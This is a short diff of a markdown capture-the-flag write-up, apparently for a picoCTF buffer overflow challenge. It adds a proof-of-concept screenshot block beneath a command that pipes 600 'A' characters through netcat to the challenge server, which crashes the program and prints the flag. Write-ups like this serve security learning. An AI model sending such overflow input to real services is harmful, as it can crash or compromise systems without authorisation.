@@ -15,6 +15,11 @@ Instead of manual entry, I used a Python one-liner to pipe 600 characters into t
 **Command:**
 python3 -c 'print("A"*600)' | nc saturn.picoctf.net 64825
 
+### Proof of Concept (PoC)
+
+<div style="text-align: center; margin: 20px 0;">
+  <img src="/assets/img/screenshote.jpg" alt="Exploit Screenshot" style="border-radius: 8px; border: 1px solid #333; max-width: 100%; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
+</div>
 
 ### Result
 The program crashed as expected and printed the flag.
